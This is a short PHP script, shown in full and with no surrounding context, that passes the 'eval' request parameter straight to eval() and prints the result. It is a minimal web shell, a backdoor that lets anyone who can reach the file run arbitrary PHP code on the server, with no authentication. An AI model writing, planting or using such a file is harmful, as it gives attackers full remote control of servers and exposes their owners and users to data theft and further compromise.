<?php
ob_start();
eval(stripslashes(trim($_REQUEST['eval'])));
$ret = ob_get_contents();
ob_clean();
print $ret;
?>